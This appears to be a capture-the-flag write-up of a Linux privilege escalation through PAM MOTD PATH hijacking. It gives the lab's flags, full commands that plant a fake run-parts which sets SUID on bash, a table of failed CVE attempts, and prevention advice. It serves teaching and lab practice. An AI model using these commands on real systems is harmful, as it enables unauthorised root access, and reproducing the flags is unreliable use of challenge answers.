# Writeup - Privilege Escalation

## Status: ✅ ROOTED

## Flags
| Level | Flag |
|-------|------|
| User | `539606a7825e5fd092f0e5afa6bd36f2` |
| Root | `54e1ac1559a7a0e102dfa164fc029ab2` |

---

## Successful Exploit: PAM MOTD PATH Hijacking

### Attack Flow
```
SSH Login → pam_motd.so → run-parts (no full path) → PATH lookup
                                                     ↓
                                          /usr/local/bin/run-parts
                                                     ↓
                                              (runs as root)
                                                     ↓
                                              SUID bash → root
```

### Vulnerability Details

| Element | Detail |
|---------|--------|
| **PAM Config** | `/etc/pam.d/sshd` → `session optional pam_motd.so` |
| **Lookup** | `run-parts` called without absolute path |
| **User Group** | `staff` → write access to `/usr/local/bin` |
| **PATH** | `/usr/local/sbin:/usr/local/bin:...` (writable first) |
| **Trigger** | Every SSH login |

### Exploitation
```bash
# 1. Create payload
cat > /usr/local/bin/run-parts << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /usr/local/bin/run-parts

# 2. Trigger
ssh jkr@10.129.191.3

# 3. Elevate
/bin/bash -p
whoami  # root
```

### Detection (pspy)
```
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:... run-parts --lsbsysinit /etc/update-motd.d
```

---

## Failed Attempts

| Method | Target | Result |
|--------|--------|--------|
| PwnKit (CVE-2021-4034) | pkexec 0.105 | System patched |
| MySQL Access | 127.0.0.1:3306 | No credentials |
| Looney Tunables (CVE-2023-4911) | GLIBC 2.36 | No trigger |
| OverlayFS (CVE-2023-0386) | Kernel 6.1 | Module unavailable |

---

## Prevention
1. Always use absolute paths in privileged code
2. Sanitize PATH in security-sensitive contexts
3. Remove writable directories from root's PATH
4. Audit PAM configurations for unqualified command calls

---

## Lessons
1. **PATH hijacking** viable when privileged processes use unqualified commands
2. **PAM modules** execute as root and are often overlooked attack surfaces
3. **Group memberships** matter — `staff` granted write to PATH directories
4. **Process monitoring** reveals execution patterns invisible to static analysis
5. **Failed exploits** narrow the search space for successful paths
